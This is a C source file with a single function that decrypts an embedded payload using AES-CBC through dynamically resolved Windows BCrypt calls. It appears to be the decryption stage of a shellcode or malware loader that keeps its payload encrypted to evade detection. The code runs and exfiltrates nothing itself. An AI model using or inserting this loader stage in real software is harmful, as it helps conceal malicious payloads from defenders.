#include "../include/common.h"

//#define NT_SUCCESS(Status)(((NTSTATUS)(Status)) >= 0)

INT DecryptPayload(PINSTANCE inst){
  BCRYPT_ALG_HANDLE hAlg = NULL;
  BCRYPT_KEY_HANDLE hKey = NULL;
  NTSTATUS status = 0;

  DWORD cbKeyObject = 0, cbData = 0;
  PBYTE pbKeyObject = NULL;
  PBYTE pbPlainBuf = NULL;

  PBC_FUNCS bc = &inst->bcrypt_dll.bcrypt;
  PK32_FUNCS k32 = &inst->kernel32_dll.k32;

  status = bc->pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
  if(!NT_SUCCESS(status)){
    printf("Algorithm provider opening was unsuccessful\n");
    return -1;
  }

  status = bc->pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, (ULONG)((wcslen(BCRYPT_CHAIN_MODE_CBC) + 1) * sizeof(WCHAR)), 0);
 
  /*status = bc->pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAINING_MODE), 0);*/
  if(!NT_SUCCESS(status)){
    printf("Setting properties was unsuccessful\n");
    goto cleanup;
  }

  status = bc->pBCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
  pbKeyObject = (PVOID)k32->pHeapAlloc(k32->pGetProcessHeap(), 0, cbKeyObject);

  status = bc->pBCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)inst->pKey, 32, 0);
  if(!NT_SUCCESS(status)){
    printf("Key generation was unsuccessful\n");
    goto cleanup; 
  }

  pbPlainBuf = (PBYTE)k32->pHeapAlloc(k32->pGetProcessHeap(), HEAP_ZERO_MEMORY, inst->dwPayloadSize);
  if(!pbPlainBuf){
    printf("pbPlainBuf error\n");
    goto cleanup;
  }
  //

  BYTE tempIV[16];
  memcpy(tempIV, inst->pIV, 16);

  status = bc->pBCryptDecrypt(hKey, (PBYTE)inst->pPayload, inst->dwPayloadSize, NULL, tempIV, 16, pbPlainBuf, inst->dwPayloadSize, &cbData, 0);
  if(!NT_SUCCESS(status)){
    printf("Decryption was unsuccessfull\n");
    goto cleanup;
  }


  inst->pPayload = pbPlainBuf;

  printf("Payload successfully decrypted!\n");

  bc->pBCryptDestroyKey(hKey);
  bc->pBCryptCloseAlgorithmProvider(hAlg, 0);
  k32->pHeapFree(k32->pGetProcessHeap(), 0, pbKeyObject);

  return 0;

  cleanup:
    if (hKey) bc->pBCryptDestroyKey(hKey);
    if (hAlg) bc->pBCryptCloseAlgorithmProvider(hAlg, 0);
    if (pbKeyObject) k32->pHeapFree(k32->pGetProcessHeap(), 0, pbKeyObject);
    return -1;

}
  

